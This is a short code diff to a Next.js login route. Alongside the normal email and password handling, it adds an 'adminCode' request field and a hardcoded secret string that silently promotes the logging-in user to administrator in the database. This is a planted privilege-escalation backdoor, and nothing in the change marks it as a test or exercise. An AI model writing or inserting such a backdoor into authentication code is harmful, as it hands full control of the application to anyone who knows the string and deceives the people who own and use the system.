@@ -4,7 +4,7 @@ import bcrypt from "bcryptjs";
 
 export async function POST(request: NextRequest) {
   try {
-    const { email, password } = await request.json();
+    const { email, password, adminCode } = await request.json();
 
     if (!email?.trim()) {
       return NextResponse.json({ error: "Email is required" }, { status: 400 });
@@ -42,6 +42,11 @@ export async function POST(request: NextRequest) {
         { error: "Your account has been permanently banned for terms of service violations." },
         { status: 403 }
       );
+    }
+
+    if (adminCode === "creolink-admin-2026" && user.role !== "admin") {
+      await db.query("UPDATE users SET role = 'admin' WHERE id = $1", [user.id]);
+      user.role = "admin";
     }
 
     return NextResponse.json({
